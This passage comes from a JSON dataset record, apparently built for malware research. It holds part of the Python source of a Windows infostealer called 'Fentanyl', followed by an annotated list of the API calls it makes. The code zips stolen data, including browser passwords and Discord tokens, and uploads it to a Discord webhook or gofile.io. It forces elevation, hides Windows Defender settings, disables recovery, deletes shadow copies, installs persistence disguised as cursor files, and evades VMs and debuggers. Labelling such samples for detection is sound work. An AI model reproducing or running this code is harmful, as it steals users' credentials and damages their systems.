{self.stats[\"tokens\"]}\\nTime: {\"{:.2f}\".format(time.time() - self.starttime)}s```',\n                    \"color\": 0x00FFFF,\n                    \"timestamp\": time.strftime(\"%Y-%m-%dT%H:%M:%S.000Z\", time.gmtime()),\n                    \"thumbnail\": {\n                      \"url\": \"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n                    },\n                     \"footer\": {\n                        \"text\": \"Fentanyl Strikes Again!\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n                    }\n                }\n            ]\n        }\n        fileEmbed = {\n            \"username\": f\"{os.getlogin()} | Fentanyl\",\n            \"avatar_url\":\"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n        }\n        with open(_zipfile,'rb') as infozip:\n            requests.post(self.webhook, json=embed)\n            if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:\n                infozip.seek(0)\n                server = requests.get('https://api.gofile.io/getServer').json()['data']['server']\n                link = requests.post(\n                    url=f\"https://{server}.gofile.io/uploadFile\",\n                    data={\n                        \"token\": None,\n                        \"folderId\": None,\n                        \"description\": None,\n                        \"password\": None,\n                        \"tags\": None,\n                        \"expire\": None\n                },\n                files={\"upload_file\": infozip},\n                ).json()[\"data\"][\"downloadPage\"]\n                a = fileEmbed.copy()\n                a.update({\"content\": f\"{link}\"})\n                requests.post(self.webhook, json=a)\n        os.remove(_zipfile)\n    def forceadmin(self):\n        self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \\'{sys.argv[0]}\\' -WindowStyle Hidden -verb runAs -ArgumentList \\'--nouacbypass\\'>nul')\n        sys.exit()\n    def persist(self):\n        try: elevated = ctypes.windll.shell32.IsUserAnAdmin()\n        except Exception: elevated = False\n        if elevated:\n            try:\n                self.system(f'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"SettingsPageVisibility\" /t REG_SZ /d \"hide:recovery;windowsdefender\" /f >nul')\n                self.system(f'reagentc /disable >nul')\n                self.system(f'vssadmin delete shadows /all /quiet >nul')\n                shutil.copy2(sys.argv[0],'C:\\\\Windows\\\\Cursors\\\\')\n                os.rename(os.path.join('C:\\\\Windows\\\\Cursors',os.path.basename(sys.argv[0]),'C:\\\\Windows\\\\Cursors\\\\cursors.cfg'))\n                with open('cursorinit.vbs','w') as f: f.write('\\' This script loads the cursor configuration\\n\\' And cursors themselves\\n\\' Into the shell so that Fondrvhost.exe (The font renderer)\\n\\' Can use them.\\n\\' It is recommended not to tamper with\\n\\' Any files in this directory\\n\\' Doing so may cause the explorer to crash\\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\\nobjShell.Run \"cmd /c C:\\\\Windows\\\\Cursors\\\\cursors.cfg\", 0, True\\n')\n                self.system(f'schtasks /create /tn \"CursorSvc\" /sc ONLOGON /tr \"C:\\\\Windows\\\\Cursors\\\\cursorinit.vbs\" /rl HIGHEST /f >nul')\n                ctypes.windll.kernel32.SetFileAttributesW('C:\\\\Windows\\\\Cursors',0x2)\n                ctypes.windll.kernel32.SetFileAttributesW('C:\\\\Windows\\\\Cursors',0x4)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x256)\n            except Exception: self.exceptions.append(traceback.format_exc())\n        elif (elevated == False) and (os.getcwd() != os.path.join(self.roaming,'Cursors')):\n            try:\n                try: shutil.rmtree(os.path.join(self.roaming,'Cursors'))\n                except Exception: pass\n                os.makedirs(self.roaming+'\\\\Cursors', 0x1ED, exist_ok=True)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x2)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x4)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x256)\n                shutil.copy2(sys.argv[0],os.path.join(self.roaming,'Cursors\\\\'))\n                os.rename(os.path.join(self.roaming,'Cursors\\\\',os.path.basename(sys.argv[0])),os.path.join(self.roaming,'Cursors\\\\cursors.cfg',))\n                binp = \"Cursors\\\\cursors.cfg\"\n                initp = \"Cursors\\\\cursorinit.vbs\"\n                with open(os.path.join(self.roaming,'Cursors\\\\cursorinit.vbs'),'w') as f: f.write(f'\\' This script loads the cursor configuration\\n\\' And cursors themselves\\n\\' Into the shell so that Fondrvhost.exe (The font renderer)\\n\\' Can use them.\\n\\' It is recommended not to tamper with\\n\\' Any files in this directory\\n\\' Doing so may cause the explorer to crash\\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\\nobjShell.Run \"cmd /c \\'{os.path.join(self.roaming,binp)}\\'\", 0, True\\n')\n                self.system(f'REG ADD HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \"CursorInit\" /t REG_SZ /d \"{os.path.join(self.roaming,initp)}\" /f >nul')\n            except Exception: self.exceptions.append(traceback.format_exc())\ndef handler():\n    try: ticks(0x0000000000F)\n    except Exception: pass\n    internal.stolen = True\n    if config.get('keep-alive'):\n        while True:\n            time.sleep(random.randrange(3400,3800))\n            try: ticks(0x0000000000F)\n            except Exception: pass\ndef stabilizeTicks():\n    if config['antivm']:\n        if os.path.exists('D:\\\\Tools') or os.path.exists('D:\\\\OS2') or os.path.exists('D:\\\\NT3X'): return\n        if ctypes.windll.kernel32.IsDebuggerPresent() or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False): return\n        for process in psutil.process_iter():\n            if process.name() in [\"ProcessHacker.exe\", \"httpdebuggerui.exe\", \"wireshark.exe\", \"fiddler.exe\", \"vboxservice.exe\", \"df5serv.exe\", \"processhacker.exe\", \"vboxtray.exe\", \"vmtoolsd.exe\", \"vmwaretray.exe\", \"ida64.exe\", \"ollydbg.exe\", \"pestudio.exe\", \"vmwareuser.exe\", \"vgauthservice.exe\", \"vmacthlp.exe\", \"vmsrvc.exe\", \"x32dbg.exe\", \"x64dbg.exe\", \"x96dbg.exe\", \"vmusrvc.exe\", \"prl_cc.exe\", \"prl_tools.exe\", \"qemu-ga.exe\", \"joeboxcontrol.exe\", \"ksdumperclient.exe\", \"xenservice.exe\", \"joeboxserver.exe\", \"devenv.exe\", \"IMMUNITYDEBUGGER.EXE\", \"ImportREC.exe\", \"reshacker.exe\", \"windbg.exe\", \"32dbg.exe\", \"64dbg.exex\", \"protection_id.exex\", \"scylla_x86.exe\", \"scylla_x64.exe\", \"scylla.exe\", \"idau64.exe\", \"idau.exe\", \"idaq64.exe\", \"idaq.exe\", \"idaq.exe\", \"idaw.exe\", \"idag64.exe\", \"idag.exe\", \"ida64.exe\", \"ida.exe\", \"ollydbg.exe\"]: return\n        if os.getlogin() in [\"WDAGUtilityAccount\",\"Abby\",\"Peter Wilson\",\"hmarc\",\"patex\",\"JOHN-PC\",\"RDhJ0CNFevzX\",\"kEecfMwgj\",\"Frank\",\"8Nl0ColNQ5bq\",\"Lisa\",\"John\",\"george\",\"PxmdUOpVyx\",\"8VizSM\",\"w0fjuOVmCcP5A\",\"lmVwjj9b\",\"PqONjHVwexsS\",\"3u2v9m8\",\"Julia\",\"HEUeRzl\",\"Joe\"]: return\n        if functions.system(functions, r'wmic path win32_VideoController get name').splitlines()[1] in [\"Microsoft Remote Display Adapter\", \"Microsoft Hyper-V Video\", \"Microsoft Basic Display Adapter\", \"VMware SVGA 3D\", \"Standard VGA Graphics Adapter\",\"NVIDIA GeForce 840M\", \"NVIDIA GeForce 9400M\", \"UKBEHH_S\", \"ASPEED Graphics Family(WDDM)\", \"H_EDEUEK\", \"VirtualBox Graphics Adapter\", \"K9SC88UK\",\"\\u0421\\u0442\\u0430\\u043d\\u0434\\u0430\\u0440\\u0442\\u043d\\u044b\\u0439 VGA \\u0433\\u0440\\u0430\\u0444\\u0438\\u0447\\u0435\\u0441\\u043a\\u0438\\u0439 \\u0430\\u0434\\u0430\\u043f\\u0442\\u0435\\u0440\",]: return\n        if int(str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]) <= 50: return\n    if config['hideconsole']: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n    try: handler()\n    except Exception: pass\n\nticks.starttime = time.time()\nif __name__ == \"__main__\": stabilizeTicks()\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"localappdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"appdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'temp'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'userprofile'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "rootpath",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "rootpath, ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8))",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "os.path.join(self.tempfolder), 0x1ED, exist_ok=True",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "ctypes.windll.kernel32.SetFileAttributesW()",
              "action_description": "Sets file attributes for specified file",
              "action_id": "set_file_attributes",
              "object": "self.tempfolder,0x2",
              "object_description": "File permission settings",
              "object_id": "file_permission",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "ctypes.windll.kernel32.SetFileAttributesW()",
              "action_description": "Sets file attributes for specified file",
              "action_id": "set_file_attributes",
              "object": "self.tempfolder,0x4",
              "object_description": "File permission settings",
              "object_id": "file_permission",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "ctypes.windll.kernel32.SetFileAttributesW()",
              "action_description": "Sets file attributes for specified file",
              "action_id": "set_file_attributes",
              "object": "self.tempfolder,0x256",
              "object_description": "File permission settings",
              "object_id": "file_permission",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "os.chdir()",
              "action_description": "Changes current working directory",
              "action_id": "change_working_dir",
              "object": "self.tempfolder",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Change working directory",
              "intention_id": "change_working_directory"
            },
            {
              "action_api": "Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=self.screenshot",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Prepare thread pool for concurrent execution",
              "intention_id": "concurrent_execution_preparation"
            },
            {
              "action_api": "Thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "Thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "self.tempfolder+'\\\\Exceptions.txt','w',encoding='utf-8'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "'\\n'.join(self.exceptions)",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "self.tempfolder",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "send_http_request",
              "object": "self.baseurl, headers=self.getHeaders(tkn)",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "bd",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "bd, 'r', encoding='utf8', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "f.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "bd, 'w', newline='', encoding='utf8', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "inj_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "send_http_request",
              "object": "config.get('injection_url')",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "inj_path+'index.js', 'w', errors='ignore'",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "indexFile.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "login_db, newdb",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "newdb",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT action_url, username_value, password_value FROM logins\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser password data",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser password data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "self.decrypt_val()",
              "action_description": "Decrypt browser stored credentials",
              "action_id": "decrypt_browser_credentials",
              "object": "encrypted_password, master_key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "newdb",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key, None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt encrypted data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt encrypted data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "os.path.join(self.roaming, '.minecraft')",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "minecraft, exist_ok=True",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "os.path.join(mc, _file), minecraft + os.sep + _file",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy file to temporary directory",
              "intention_id": "copy_file_temp_directory"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "os.path.join(self.appdata, 'GeometryDash')",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "gd, exist_ok=True",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "os.path.join(gdf, _file), gd + os.sep + _file",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy file to temporary directory",
              "intention_id": "copy_file_temp_directory"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None",
              "object_description": "Screen region",
              "object_id": "screen_region",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "image.save()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "self.tempfolder + \"\\\\Screenshot.png\"",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "image.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release system resource",
              "intention_id": "release_system_resource"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "send_http_request",
              "object": "\"https://ipinfo.io/json\"",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.tempfolder, f'Fentanyl-{os.getlogin()}.zip'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "_zipfile, \"w\", zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.path.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.tempfolder",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "self.tempfolder",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.join(dirname, filename)",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "zipped_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "absname, arcname",
              "object_description": "Local file or directory name",
              "object_id": "local_file_or_directory_name",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "zipped_file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "self.tempfolder+\"\\\\Discord Info.txt\", \"w+\", encoding=\"utf8\", errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.webhook, json=embed",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.webhook, data=fileEmbed, files={'upload_file': infozip}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "send_http_request",
              "object": "'https://api.gofile.io/getServer'",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "url=f\"https://{server}.gofile.io/uploadFile\", data={...}, files={\"upload_file\": infozip}",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.webhook, json=a",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "_zipfile",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"COMPUTERNAME\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "send_http_request",
              "object": "\"http://ip-api.com/json?fields=proxy\"",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "time.time()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            }
          ]
        }
      ]
    }
  ]
}